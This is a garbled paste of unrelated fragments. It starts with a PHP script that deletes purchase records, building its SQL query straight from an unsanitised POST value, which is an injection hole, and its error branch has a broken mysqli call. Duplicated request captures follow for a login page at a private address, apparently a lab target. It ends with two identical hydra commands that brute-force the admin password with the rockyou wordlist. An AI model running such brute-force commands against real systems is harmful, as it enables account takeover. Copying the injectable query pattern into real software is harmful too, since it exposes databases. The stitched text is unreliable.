<?php require_once "validador_acesso.php" ?>

<?php

require 'conexao.php';

//print_r($_POST["remover"]);

$id = $_POST["remover"];

$sql = "DELETE FROM compras WHERE id='$id'";

if($pdo->query($sql)){
    header("Location: ../app_cartao/index.php");
}else{
    echo "Error: " . $sql . "<br>" . mysqli_error($pdo);
}

$pdo = null;

?>


{"POST":{"scheme":"http","host":"10.10.14.112","filename":"/Account/login.aspx","query":{"ReturnURL":"/admin/"},"remote":{"Address":"127.0.0.1:8080"}}}

{"POST":{"scheme":"http","host":"10.10.14.112","filename":"/Account/login.aspx","query":{"ReturnURL":"/admin/"},"remote":{"Address":"127.0.0.1:8080"}}}POST
	http://10.10.14.112/Account/login.aspx?ReturnURL=/admin/
	
	POST
	http://10.10.14.112/Account/login.aspx?ReturnURL=/admin/
	
	hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.14.112 http-post-form "/Account/login.aspx?ReturnURL=/admin:__VIEWSTATE=kan4tM58kllm907anUXrnOBi2kXP%2Bp57x5Eil7MjkTfsdLt7%2Fp1t6aTltopg88yKreqmws1pqbaZBhgpdJHXD4LxPZeBropVLBbhLQkJRlmtdR%2B345hC2XQbfjQhEsXMEyakRiBQ0emlp7Xj8vmkzMk1s22itPcT7W0sgbvsctYFYgWbI897X2SS8Lo3SdWXOWvutH64PoRpKoWU%2FY%2BB1kKrJOMDGlo1YgpPTAfZBOHwWLaWy%2B%2FGwrHWYBEpDcKpNCCCvsTiFqFsV1ltcMbzzviHOMaKTtPN5jCKi2O0B%2FQN6xubOk%2BxcxOHwDO7JQtpP8X7K09YeRxnmO5A2SnFdjdyad3zWM1ocoWk6hN7oGD0ioz7&__EVENTVALIDATION=4W%2B%2FogjRrY9DsQNxwC8aiJyoiYKRcasWtTuE%2BuLgPqP6u8V3NVfBriObu5NJnDNIO3LgiqS2GwfgfbFL2TPyaWPCPZCsVoEeNp3A0xoJK8ZaJvaJuCHK3jNyTF135AuTQedbIEvWLP9j%2F%2B6YHbsld5sd%2F4dfs1JYop1BcQ83ul2M%2Beke&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed
	
	hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.14.112 http-post-form "/Account/login.aspx?ReturnURL=/admin:__VIEWSTATE=kan4tM58kllm907anUXrnOBi2kXP%2Bp57x5Eil7MjkTfsdLt7%2Fp1t6aTltopg88yKreqmws1pqbaZBhgpdJHXD4LxPZeBropVLBbhLQkJRlmtdR%2B345hC2XQbfjQhEsXMEyakRiBQ0emlp7Xj8vmkzMk1s22itPcT7W0sgbvsctYFYgWbI897X2SS8Lo3SdWXOWvutH64PoRpKoWU%2FY%2BB1kKrJOMDGlo1YgpPTAfZBOHwWLaWy%2B%2FGwrHWYBEpDcKpNCCCvsTiFqFsV1ltcMbzzviHOMaKTtPN5jCKi2O0B%2FQN6xubOk%2BxcxOHwDO7JQtpP8X7K09YeRxnmO5A2SnFdjdyad3zWM1ocoWk6hN7oGD0ioz7&__EVENTVALIDATION=4W%2B%2FogjRrY9DsQNxwC8aiJyoiYKRcasWtTuE%2BuLgPqP6u8V3NVfBriObu5NJnDNIO3LgiqS2GwfgfbFL2TPyaWPCPZCsVoEeNp3A0xoJK8ZaJvaJuCHK3jNyTF135AuTQedbIEvWLP9j%2F%2B6YHbsld5sd%2F4dfs1JYop1BcQ83ul2M%2Beke&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed"
